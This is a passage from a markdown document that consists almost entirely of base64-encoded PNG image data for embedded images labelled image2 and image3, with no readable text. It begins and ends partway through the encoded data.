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>

[image2]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAloAAACHCAYAAADOZPcyAAAaIklEQVR4Xu2ciZdVxZ3H8wfMmZkzZzSJo0QzqPieoiIqbiMaRcSd44ZJ9Bj3aBxMiAYdNbhgwIVFAUEEBBdcEAKKikgCIjLiggoIyGbTbN3sihJlqOFbr3+3q+vd9x6KV5rm8znne2q5VXXr1r196/uqLvzIAQAAAEAm/CjOAAAAAIDvB4wWAAAAQEZgtAAAAAAyAqMFAAAAkBEljVbHJ/7LXf7s2XF25nz59aYkPnb2yODID8eKjdU+1PkP6PFP0dHvxva0s2xDlRcAAAA0DUoarSP77ONa9PznODtzQnO1s4zWYb1+HGftMBgtAACA3Y+SRuv1+ePcY9N7Jenj++3vDrr/X90Vz53nV7vEhSNOckPe6euPffN/X/s64pAH/z2pa2VbPriHu3bUhYl5m7H0LXfjmF+7s4ce49PiuH7NXes+e7tB0x/y6d88d6677sWLGpgU1b9zQuciE6hy+Qf+zR37yM99f4QM08bNG5K4eKdqqrt05BleS9cv9nnWZuve/7Gt/n/6tPoi02Nt6Vj7x1q5g3r+i3vhoxFJm7quE/u3SNpXXwdMu9/3JUT5Kqf8W16+2ucd1beZ74faVF9Co3XB8Lb++KEP7en+sWVz0fgaNr4AAADQ+Eg1WvdM/GMSN8NkhkOY8ZEpqf1iVZLf5uF9ffjA5Du8GdA24ILVc92aTbWJqZHxUVpGa8Pm9UldI21FS2VVb8qiCW7r1q1JXkiHwa2TeDmjJeNiWH9DU6TyVtaMlkzOU+8PSspYG6EBtDoyaUvWLkzyjbCs4mrzf6veTPLUl9Bohdu2ZqxUpnr9Ej++GgsbXwAAAGicpBotTewyA5K2EEWa0RInPZpLVpcsrPl8hTt32HHJCozMwzUvnO9XsCSZGTNPMeWMltLWhhSiFS2jnNHSqpzV7zr+Op/35ddf+L5f/2KnVKNl/TWs/TSjtWXrFnfWkDZ+RSokNlpqU6tZYV9CoyUzFZYXtvKm8b3kqXbJ+AIAAEDjJNVoaRI3Thl4iPto+bupRuvNxRN9+Orc0T6UObjtlet9XCst2ioz2g7IJXFRymiFBiM2WlrN+t3oX/o8W9ky1CdtsUnWV51/8sLXfJ4ZIW3HGTJFwtqSCdNKkxnGcOvQ6i9aM9+1LLOiZW1qqzHEymrb8cQBB/l4WEb1QqOl8spT37u9/nufp7Fp1eunPq7VrXB8AQAAoPFRZLT0L+5krIy/znrGXfTkL1KN1h9fusrHzbxopSXNfIinPxjsj9k2XSmjJZNjq0Gx0RLxOQ1twyn/jMePTPqq7UrlXTji5KQvMlXKk2ateN/nqU9Kj539rE9f/OQpPh0arTc+fdnnHdF7r8RMpV2rthWV329aj+SYHde3WOq3GTtrU/nqi/LNSH22bpEfCx0zNL5adRMyXeH4AgAAQOOjyGg1BUJTCAAAALCzaJJGCwAAAKAxgNECAAAAyAiMFgAAAEBGYLQAAAAAMgKjBQAAAJARGC0AAACAjMBoAQAAAGQERgsAAAAgIzBaAAAAABmB0QIAAADICIwWAAAAQEZgtAAAAAAyAqMFAAAAkBEYLQAAAICMwGgBAAAAZMS3MlrLV6zy2h4mTpoSZ+10xr/2hg8bY99Cpk57J84CAACAXZBUo2VGpOvt3ZO8/Voc5V6d8DevkD32zjdIG4cdfUqctd2Y0Zg3f6GbNXtudLQ85Yxgs/2P8OGO9E1srxF69/0P3TffbGmQV65/hsZanHP+ZQ0PbGPNmrVu7br1cXYRuod77XtoyfsDAAAA2ZNqtE7tcKEPW7Y+yZsd0avvoMRotW3X0b3xtzd9/l3dH0rqKf+F0S/5uMzMDTfd6hYvqUqOiy1btrhjTjzDfbpgsU8/MmCIz1NdmQid78CWx7vf33yn27x5s5eYMHGyr2eo3rTpMxrkiWtvuNnXXb9ho/vqq6/caWd1chs3fu6PxUZLfVD9TZu+TOo/+cwob47CdtWO+qd2ZJ6a59r4c4jqZSv8OVRm69atvtwDvQf4Y2rjdzfdlrQj83N+pyvdrXcUDOzlV3dO4obOfdxJZ/v4H7ve5UO1P3DwCB9vcWhhbMTatev8MaOqqtqfe8HCxUneS+NfT+IAAADww5JqtPbc52C3bv0Gd2+P3smqlgyQTJZWScRe+x3mQzMtP252iA9nz5nnQ1tJiVdULH3djbf4UKs213fu6k2KHbOVnC++2OQl89H74UE+T32zMsuWr/QGZ/KUaT5PqC1DhkgcfUIHH8ZG6+BWbX0455P5PhSqf2zbM735GzbiWZ9Xqp1XJkxyZ3W81Mfnzl/g+j061Mfvvq+XD3Ue9T/EVgS7dO3mzyGTN3rsK8lxreDJ1AoZXZ1D2CpWeO6eD/bz4yaDKtTvsIyw+wIAAAA/PKlGSyamc5fbvUnYp3mrZFUr3Do0M2SmJTQ4YX446Ytw63HmR7N9O2ZG+vYb7MPYaFm+sPOE22ppx4WMm0nERmvUmJf9MZk1Q/VXrqpJ4qJUO/G1raqp9Ub00itu9OlyRis0oGE7WuWScZr+znuJ0VNZM1oyv5ZnsvJGp0uv82GYBwAAAD88qUbr/ZkfJ6s9muzbn32Jj5czWmYctMIS5sdmxNrVKo7Kqh2tnglbfbGtMzNatbVr3KLFn/m8cEXLCI1WGLfVJiM2WtbX0PSkGa24Hat/y233uMFDn/Lxf3z9tTelwj66Vx9ttckw83T8yeckeWrHsOvrePEVfrVL5k1Y29Y3W1E0VN7Q/RO2ZQoAAAA7h1Sjpe+ibMtQRsGMSDmjpe+DVE7fEIX5sdF66+0ZvpyZF7XTvUcfn2cG4bCjfuHTZrTEkce193k6j9UzQnOl8iqn7USZOcVVV+j7KCFDt+Szpb6v4XlFmtGK25n096nJmOg6FNfqWLd7H/RxrdQJbUnaipOhtNUN4+FxXcNP923p05ddeWODPiqubVelFbftQiv/+edfJN+1aWvR4gAAAPDDk2q0fkjCrUMAAACApsRON1r6rxLi/wIBAAAAoCmw040WAAAAQFMFowUAAACQERgtAAAAgIzAaAEAAABkBEYLAAAAICMwWgAAAAAZgdECAAAAyAiMFgAAAEBGYLQAAAAAMgKjBQAAAJARqUarZvW6bVrv1q7biBBCCDV5VVWviqfCkjxdc7gbUZNDyKsSqUYrfgARQgihpq7tMVvxJIuQVA6MFkIIIVSnSsQTLEJSOTBaCCGEUJ0qEU+wCEnlwGghhBBCdapEPMEiJJUDo4UQQgjVqRLxBIuQVI4dNlrLV652A4eOKcpHCCGEdjVVIp5gdwVd83DO7bF33v3m/nzRsR1Vm3Nyrvvk9HYPPiE9vymqHBgthBBCqE6ViCfYxqJjzk03Nc0OyrsjTiscO/P64uM7qnJGq3mrnPtt/+L8pqhyYLQQQgihOlUinmAbg7Radef44nyp053FeSo/fFXOte6Qc0OWFvI6D827wUsK8dan590TK3JeKtvzrZxrf1Xel1W9A1rn3bBlOdf7g9JG6/63C23vuc+2sssLeSqr+keflXftrsi5/p9sM2KPFo4Nrd5mBG8oxDt2yfvzWl8tHPhpzrU4upBWX+8YV3xtO0vlwGghhBBCdapEPMHuLNkKlsJSJktm5E/PF+eFBuXynoUwLCdDZHEZLIurzK2jC6YoLJtmtGzbUNuWv7q7ELd2+83Jub0PzLtH5+fcaVfW15VxG7gg536Wzyf1rc7NI+vrSrqOtPPuLJUDo4UQQgjVqRLxBLuz1Hdm+ZUsk20bmnbEaEkyPJWMllaz1LdQYbsySns1r69z+7i8X8VS/PgL8q5Vu7x7YHrO9XqvYLy0CmZGy7RbGS3pvl7Di/IQQgihXU2ViCfYxq7/HtLQ8Ggb7yf7NjRAUimjJdMTl7X0/kfmvdmJj6v9QYvq27hrQs6nY6PVY2p9WyqjY/quSytddh5rQ+XD8+x2RgshhBBqCqpEPMEiJJUDo4UQQgjVqRLxBIuQVA6MFkIIIVSnSsQTLEJSOTBaCCGEUJ0qEU+wCEnlwGghhBBC21RVvSqeDouIJ1iEpHKkGq1PFy0regARQgihpqya1evi6bCIjzb19//dQDzRot1XeibKkWq0AAAAAGDHwWgBAAAAZARGCwAAACAjMFoAAAAAGYHRAgAAAMgIjBYAAABARmC0AAAAADICowUAAACQERgtAAAAgIzAaAEAAABkBEYLAAAAICMwWgAAAAAZgdECAAAAyAiMFgAAAEBGYLQAAAAAMgKjBQAAAJARGC0AAACAjEg1Ws32PyKJn3P+ZW7lqprgaPaE5zeu79w1zmq0TJ32ToP08hWr3Np16xvkbS+HHX1Kg/RxJ53tJk6a0iAvptL96ttvcJzVAN1z8eqEvzXI/zaMf+0NH6qN7W1n5kezfbjH3nmvvfY9NCpRmnicRKVx+Lbccts9SXzr1q2+j//z578EJQrMnb/A1dauSdL7NG/lRo99JShRYPyrE93t3Xok6T/c8md3/MnnBCUKfP31N+7UDhc2yDvmxDMapEsxb/5CN2v2XB/Xcyi2935sD998s6VBetnylX5c1Gfx0cdzfHpVTa1Pb9myxacXLFzs0/q7+HGzQ9xbb8/w6SOPa+/2zx/jTm5/vk8DAOzqfCujdesd3d3lV3f28eplK/xkoxdtt3sf9Hld/tQtqWcT0KDHR7i1a9c1OK421JZYv2Gje/KZUT5uBiI8f8eLr3BDnnimgdG6q/tDSfyObj19GPZt8+bN7pEBQ3z841mfJGWFXvStjz3Nvfv+hz6ta9M5DLW3cePn7sJfXp3k6Ro1sS1eUpXknXZWJ1/OGDh4hOs3cKhvt3mujfv9zXcmx6694WZ36RU3+mv96quv/PliE6CxbNuuY4M2hQzEVdf9IRkvjZXa0XWpDdVRXWFtL/lsadiE75Ou2SY/GS31f9SYl5MyujfTphcmu3JGS/2YMHFyktbY3HDTrQ3GRvdRk6nKmtEK+6l7oPHVpBxiRis0TZ273J7Ehe6x9VPo3DffendSR+fQvVLbGh8bp1NOv8Af796jjxv38oSkrOrbdWqc7Blas2atD0PCZ3DPfQ72ocbarsv44otNyf3tenvhvj3/4jj3yoRJYTF/vdamnlk7Z9oPjThP4xsy8rkxPpSxsvP0fKifb1fSPTm/05WuqqraX6+es/CeCBsrjV+Yr3R4z/Uc6Zl8ftQ497ubbkvyhd0H669dvxlFyz/zvF/7UD8cxL09evvQkDkFAGgKlDRaeuFK7c++xId6eevXp17A9nLVRDF5yjR30GEn+HSnS69L2rAXrH6d6iW6bv0Gf7xL125+ot206Uv/K19t22RjKy32MlZZvdRlIMJJTkbGTN6xbc8s6psmulJmwSaoSX+f6n9tH31CB58+q+OlyfGnRo5yU6ZO9xOU0Dnsl7jQhCVUV31Qf2bPmecnMRFPiuq7mQj9elc/7XxGv0eH+jCeQC2tiW7Dxo2+LY2ZrstWfGzcbSWhzyOPJfVFuzMu8qEZMGvz4FZtfag+aYx7PzzIzXh3ZsmxUzmN8zPPjU5Mm8ZGlOp3Wj9tDM678PKkvEgzWsNGPJvEZSKE+q2x0H3XSonasjpqW+j+2Tj9vMXRPk/3W/3Xc/fiX8f7yV8/Aj5dsNg/nzZO4rY77ytarQmfwZatT0risWkOjZb1K3zOjdBo2bWL+PlJy4vHW2OjcdAY232VGVRfJGH3U6GecRH+zSr/wJbH+/he+x3mQxvP8J4fckTh2nVN1rahFTn1Q+Mn3p/5sQ/tb3vY8JHe5Nk7o1ffQT4Mr//h/o97AQA0BUoaLcNWtMI8e8nr16gmEpsAbWtC2C90GTG9vGW8dDycIMzQlTJaYdlwktIkqwni6t928eeI+1bOaIVp9d0mivic4WRpYVjGpAnCzmXEk2JotCwM2xcyDDIktlJihKZD4xMaLbsWK2PpeOLXpKW+yiwKG2cb0/B6lFdq7MJ7YG3EY2OERivuZ3i+EBsbGdexL73mV+5CNIGrTqs27XzZ8JzWdtjHtHGy8+oaZS415mPqtvU0Ttq6KkUpoxWvzJUyWlrZDPk+jZaQKdXfhf7W9Depe1TKaBnh8xWPleqVu+ex0ZIx1Y8PPWf2AyY2WvrhJfSc636mGa14dQsAYFdmu42WLfELe8n/dN+WyVbLOzM+SI4bevHr5asX//4HH+vzQiNxeJtTfdv2q3p7jZbQZGzl4r7p5W95sVmwlTah88arPBZWMlohdm1GPCmGRktbSELnDScpG5e4brglNv2d98oaLZugYqNl7NfiKB/GRis2iqWMVvidkG1PxWNjlDNapb4RS1vRCrF7auOp7VDD6oR9jMcpXL0JsWdYyHzZN00x4TNo16cfD/HKV/js2OqvxsvuvREaLdXRqprQ31VMqfEN0fjoGZHJ0nOuHyHf1WhZ++XueWy00u61PZN6plTWni09A7p+a7/UMwEAsKuz3UZL2GqAfb+hicO+K0l78VueVrfCb22sHUPbDVpZ+ODDWT6trTm9oLVVoXJaZYiNlla1tM1lxH276FfX+PTSpcuSMuK11//u87UlKjQhKW2rPdavckbLVlbUL8W1HaW0fVeibcnw+tSW0lrd07aV4lqNC9F3bsqPTc/Fv77W59v2VzmjZW1o2yxE/VK+bW3GRkuraTqubSLF9a2ZJn2t1ITmwMq1OLSwvSTisTGsL2n91IfPcTuiktHSN0Sqp2+srKzSenasjn0fpm8D43ESukYd18fY+o5P8dPPucQbLBsnEW8dKt+kdu3ZVF07rvLhqpmZEMXtO0a1qy1x9cnK2f3Q86Rr0TOlj+nN2ITnTksboSkyUx0aLZXXj59yRksrTCqn8RDl7rnQsfB7Nls9tY/d9X2l0vatpP6hgNLhN5RKq5xx4qnnJXEAgF2dVKPV2NFEZFsTAPD9EJtSAADYcXZJo9V/0LDkXzICwPeDtkHD7ywBAGDH2SWNFgAAAMCuAEYLAAAAICMwWgAAAAAZgdECAAAAyAiMFgAAAEBGYLQAAAAAMgKjBQAAAJARGC0AAACAjMBoAQAAAGQERgsAAAAgIzBaAAAAABlR0mjNW1DlZs1djBBCCDV5LVtRG0+DJVn9zSw3oia/TTm0Wyvv3tzQJX48ikg1WrVr1rm16zYihBBCu43mzF8ST4dFPF1zeMqEi3Zn6ZkoR6rRih8+hBBCaHdQJeJJFiGpHBgthBBCqE6ViCdYhKRyYLQQQgihOlUinmARksqB0UIIIYTqVIl4gkVIKgdGCyGEEKpTJeIJdnfXuTflXPfJ/AvMcvwgRmv6u7Pdfb2Gu8VLlid5Pfo86UaOet3Vri7+F449+z7ly4d5/R8fVbL8X3qPcMNHvpKkJ7/1gS+vc6SVV9th+ZEvTiw6n6nvwOfdh7M+dWNfmerTy5bX+v49POj5pMxjT/zVvTxhms+3PPVp4LAxvi9xmwghhBqnKhFPsI1dzQ7KuyNOKxihM68vPr6janNOaaPVvFXO/bZ/cX5TVDm+k9FaVbvOTZrynhv61Mvus6Wrkvz3Zs51vQc859ak1Bk4dExitGS8Xn1juo8Pf7be8MTlLa7yFi9VPjROPfqM8OG8BUtTy8s4heWl+wOTFKr3gGcbHB88YmxyzWonPPbBx/OTenPmLfZhKQOHEEKo8akS8QTbWLTH3ulm5+ATivN/sm/elw/rhGmL9/4g547tWLrsLy7Le6MVH5eGLc+5eybm3Z771OeHZe+ZlHPDV9Wn+3+Sc63aFcp2HpZzP8vX90WhDGN4nsFL0s+7s1SO72S0lq9c7foNfsHHzUjM+mSRz4/LmkKjJZNj8VIGJzRaoSkqVT4sY+aoVPlvY7QWLKp2fR59zq9kxeWsjerlq/w4PPJYYUzClbuwLwghhBq3KhFPsDtLfWfWx0uZDZmRPz1fnHfHuPr05T0LYVhOhsji7a+qb1tlbh2dc0OrG5ZNW9Eyg3fNwzn3q7sLcWu335yc2/vAvHt0fs6ddmV9XRm7gQsKJsvqW52bR9bXlXQdaefdWSrHdzZaZoTMaNnWWinFRmvRkmU+3mvAyKKyVt7ioSkqVb5UmbTy22u0tO0ok7V6zXofxuXGjJ/iwwcfedqH2mZUqOu0VT2MFkII7TqqRDzB7izJXMlslTJZpsvua3hcJiU0KKdfWwhLGS1bNZJkysyYhWVjw6PVrLCe9TE0Wns1L+R1uK5wvMfUwjG1r2Na1VI7d01ouHol6Xy7pdFaXLXCfTx7gY/Xrl5fVCc0Wio7+MlxPq4tSIUfz1nY4Huq0Gip/MqatQ3Ka5sybD80TjI8Kv/G5Bmp5bfXaGn775lRr/t4z75P+nD862+7t2fMclXVK5NVrseeGOvDefM/S67h1YnTfTzN6CGEEGqcqkQ8we5MHXBkZaOxZ7O8O/a8QjkzXTIr2rZr3SHnhiwtlCtntGR2hi0rpGV+Dmid92mZo45dCu1r68/qHNE+77cNLa0yYbtmtAYtLGwfDlqUc2feUH8+W3ELtx3NWMpgKd3kjVYpaRUn3DarpKrq+u+7ZN7Svu0Kj4flq5fXFJWJy4ftVSpfTvE1aYVL36mFeUuqVjY4n+LltlIRQgg1PlUinmARksrxvRothBBCaFdWJeIJFiGpHBgthBBCqE6ViCdYhKRyYLQQQgihOlUinmARksqB0UIIIYS2qWb1+ng6LCKeYBGSypFqtD5dVPivFxBCCKHdRTWr18XTYRFP1xxeNMmi3Vt6JsqRarTEvAVVbtbcxQghhFCT17IVtfE0WBLMFgpViZJGCwAAAAB2DIwWAAAAQEZgtAAAAAAyAqMFAAAAkBEYLQAAAICMwGgBAAAAZARGCwAAACAjMFoAAAAAGYHRAgAAAMgIjBYAAABARmC0AAAAADICowUAAACQERgtAAAAgIzAaAEAAABkBEYLAAAAICP+H6qLHX9cwY7zAAAAAElFTkSuQmCC>

[image3]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAloAAACECAYAAABI8IWcAAAdVElEQVR4Xu2diZdV1Z3v+w9463Wvt15M2qe2ph1v4TwhYtTEKc6yool2om2MRhM7T21iR+1IjAZlUCYLIkFBBpmCICAoIgoiEEAEZAarGAuogUkJiDz247uvv1P77nurLiUcC+p+Pmt91zl73mef49pffvuC/+AAAAAAIBX+Ic4AAAAAgEMDRgsAAAAgJTBaAAAAACmB0QIAAABICYwWAAAAQEpgtAAAAABSAqMFAAAAkBJHnNF64PUfx1nfOLcN+n6c9bU4udP/iLPy2LB9rRcAAAAceTTZaJ3f41h3auf/GWenSvcPnk7um8tondXt23HWQYPRAgAAaNk02Wh1mPSQu2PIVUn65gEXu9c+7udNQ0XdCp+3bddWnx6xYIBbv221q6xb6fNvG3S5v/59z073w37n+vtbBrT1dT/bvcOnr+x7pvvt+HtdWdf/5dPD5/d3Z3f7jru4/ESfltFatHGebzN28XCft3ffXtfmxe96xZR/+Jw3hmqz6bMNbkHVHPeLke18ma5Ki3tG3OL7rNqxzqftGS7/c8Z1ef/3vg+bg57Z0DxP6/yPSfqxCffnze/vez73ac0lRHk3vNLanfnCUe6Lvbt93pqtFb5PzUeERsv6see8qX+bZG2veOn0r+rsdCtqlvh7AAAAaF6aZLRmrH7P7du3z+3Yvd0t3jTf57UtPykptwhNHKm5deBl7sv/t8fdPfxGb7w6vfeEm7B0lDdUxiXlJ/s6hSJHYRQrvLdxLu1zWpI3ZF7f5L76s43urWWj/b0ZljnrPnTtXv2ez9NV6b/M6pa0sbL4GcJ52TOHdey+0PwKPZOwcq2p3Xed+qS/ao3rdtbkGK2Lep2Qbbif7/+5zM/d1vbhsf+erO2BsGhZJUIIIYQOUsVoktE6/fn/7Q2BpCNEUchoCUWCfv367f5e0SBFwmR8FA07rcs/+Xy1/c2YnyWSuShkShoyWlb3e71PSfoY+vHLSfnYxcOS+8aMlq7hPAw9gx2TFjJahfIKzU8ociVTFBIbNT3/ncOuS+ZhczajZSbM6gtb2+27t+WsLQAAADQ/TTJarXsdn9yHZsmIo0AyZkIGwNrqmO3S3qf6+3u/OsIL+TpGK4z0hCjqtqJmsb8Pjda1/c7zeToCVPqZyb/1UaVCTKuY5K+FTFVslESh+RlaA5kpw9ooImX3T73zSFIuQqOlKJbR5sV/9deG1hYAAACanwM2Wht3rHcLq+Ym6TcWDfW/GSpktHQkqHv7jZIiWRbdUlRG5sa4oOdxvu6Do+/w6dicCP1+SXU+/+KzgkZGv6fS75pUR3MKkfFQ/pRVExPDcmP/i3wkKJyLTIzq/WTwFT5tz6D5CeXb89kz25GfpN+JiULze2HqH3yd8hmdkjIrlznSGGb03l35pq9rv/tS/jnd/tnf6/dbYZlobG0BAACgeTlgo3WkE0aGAAAAAL4JMFoAAAAAKVEyRgsAAADgmwajBQAAAJASGC0AAACAlMBoAQAAAKQERgsAAAAgJTBaAAAAACmB0QIAAABICYwWAAAAQEpgtAAAAABSAqMFAAAAkBIYLQAAAICUwGgBAAAApARGCwAAACAlMFoAAAAAKXFEGa3lKz7NSe/atSsnfaiYPGVanFWyVG3cHGelwpat2/Le7+HE9Bmz3Zdf7o2zAQAAGqVJRuu4k85N7m/60V31Bd8QPcv75aQ3ba7OSR8qzrrwijjrsEKb/sHwrWPK4qwGeWvSe3FWQlP6KTbn+QsX573fr8upZ7Z1N7S7M0kfffyZ7tvHnZ6kR415s0lzF/reP/98Z5x9UDz1p+fdGedd7gYOGRkXAQBAC+GQGK3Hn+zo7r7vIX//3394zu3bt8//6X/Llq0+r/3vnkrqvjp4hL/2fXmQv86YNcctXrLc7d271/exclWlz9+2fYc1cY882sFfbSNWJOuyq9q51WvWJXW+2LMnaRMasIsuvc73LV7s80qSH0etHnz4cXfvA//p72W0lq1YlTPvP3Xq7scUa9eu99GXq2+43e3Z86XP0xgaS3NV30rf9m/3uQ1Vm5I+tDaG9T1p8lS/fsbgoaP81eansXbs+CwZe+68Be7ETOtkTbRetvZC89FzWDsr01wsAmhttR5af83beG/qh67dT+5J0qHR0ns9r83VSZ71o6s9t+jYqYcb9+akr1plI5GnnNE2qd+p64s5YwgzWuGa7tz5d3fWBT/wc9y9e3fyfvVshuaj8pjPPvs87w8Dv37osRxDp3SInsvei71P+x7NaIXfjX1P+pa15pqv1lzfkqH/DpSuXL3Wp8N3aZSdfWlOGgAAWg5NNlqKBJiENvCwfOKkKW7AoOHemNx+5wM+P4xUWDuVafM8qVUbn7Z+KirX+A0tNEvWxvqxDTSOaCk6YFeZChkScc/9j/gNNtx4wzlZPUMRETFv/id5m/Fjv+/o+1I0Qpj5tGu3nn391crHT3jHzZr9kb9fs98g3Per9v7+3fc+cEuXrUjMT6tzLvNXG8/mp7HMsBo2ltbMyrTeYuSocf6qdjJGdXVb3Pev+VFOO1vPhtZDTJ02w19DoyVTExJGhcw42drJ6IRHbTbWfz3xTJIXti+0psb9Dz7qrxdffqO/6pvRutlzhWbWeKLDs+79r57hmhvvyBlLz3r9LT9L0uKoY1vlzDf+Hs1ohetkz2TPbGPIWNp7/LRitb8ee+I5/qpxQsx8AgBAy6TJRsuwTSbM00Yj86QNUVEhRTFE+DsfGSxForSRy5Sd3fpKnx9u6Np0GzNaVjc2WoqGaLPU+OrDNjvVV9uGjEV8jGRHh2EfOnpS/3FUxJ7fjqauuu7H/hoa0vDZjj7hLG+4RDgHG6eQ0YoJzZ2NYe1sTaydmQRhz9mY0dL8f/bz/0jmHM5d5kZtx4yd6NPWz8y/zU0MQ/jc4VGbjRUey4bfTqE1VVTs9HMvd+e0vsqnzRDrPah+OFbMhZdcm5NWhKr9Y0+5hZ8scb16v+wNqq5GbO7i77Exo2XPZPPQO4j/MGD9K1IaHmMSzQIAaNkctNFS5MBoc9n1/iqjow1JRiqOlCjCYm1lxMwQWERn9P5N3CIx1dW1PlphG5j1ZZEVHXOF2DHN9h07fB/WTvXVl0XYVB7Oy+ZtxEYrNkSFTIEMQUgc/TFksiwyU1NT5yMmwiIdNpcrr73NXwsZLZuf1l7rFXIwRktpRaJ0dFfIaG3dtt1fLWpn/cjAGMrT2sfYMw8YOCwpDyOJhdbUIlm33nGvv2rtOjzdxT+T+oijQ0ZoZML5aw6KSCqSKEKTo7lsrq7x9zJl8fdoRkvRWmF5oilGyyKYZox1dAwAAC2XJhmthtAGJNNwsMRHZHGfMktGXGaE5kHEUa84bWjs8HdhMQ21MxRBUZ116za4zs+X+zz1ab8PCwmNmzbscFzVLzaWCJ//QOofKPG6xn3H6UIoqhn/cFzmzd6fysN32RBqY7/XagjNR/01hp4pfq5C42vtw3mHz6r3ZH0ov5CZPFDCseNvHgAAWhaHxGgdLig6FG+o3xT6HZjQZm2/DYpRxM0iJAAAANDyaVFGCwAAAOBwAqMFAAAAkBIYLQAAAICUwGgBAAAApARGCwAAACAlMFoAAAAAKYHRAgAAAEgJjBYAAABASmC0AAAAAFICowUAAACQEhgtAAAAgJRoktFaWbHBbdm6AyGEEGpxqqnb6qpri/+P3hfu7O0GVWcQcsNrLow/jzyaZLTijxIhhBBqSaqu3RZvfXnEmy0qbRUDo4UQQggFKka80aLSVjEwWgghhFCgYsQbLSptFQOjhRBCCAUqRrzRotJWMY5Io/XBzPl5eQghhNChUDHijRaVtoqRqtGaPmuBW7Bopb/XVem4ztdRl55D8vJC1dRudX959Q03ZsIHiSl7beQkN2nKbPdst4GuLuhnwaJVbvCIt/P6QAghVJoqRrzRHu761jFliQZuzi8/GLW+KeM6Ti3Ly5c0Xu+l+fktTcU4pEZrQ1WNe6n/GNf1xdd8WqZGqlxdldzLcOlqbSa8MzOnj4rVG9zz+9t3/spMTZ0x33XqMTinTWi0Xigf6p7rPmi/udqWNx+pe5/hOWnNT2Po/p33Z+f1hxBCqLRVjHijPRwkUxPnNZT/6LB689VzQX09q3v0idn77h9nXN+K+rJnpuTW/cFdZd5ohW1NA6oy7pnJZe6oY+vzrZ7VlemztAzZMadk8x8akHFdZ+XO/7jTsvXatMumGxq3OVSMQ2q0xr89PSc9cNjEJKI1duL0JKL1+rj33UcLlntjtql6S06bTj0GFUwrCmXRKTNGlWs35rWP9dbkWcl9l15D3Mw5i5K0ol4yaisr1uW1QwghVJoqRrzRNocuurneYOi+w4T8OlIhI2J5Pedn3HdOyN6H9WS07P5fyrL3L63MGqEe8+sNl9RQROunT2fzzr2mzHWZmdvvHydlvLFSu16f5M/rguvL3O0d6sd/oHfGXXF3tkzzfXlNdtx4zOZSMQ6p0ZIWL6v0ESbdN2S0JEWpFF2K21sky9TnldHJvfrTNYxAbdxU66NdOi4M28nEaYy4/1lzF7sxE6Z5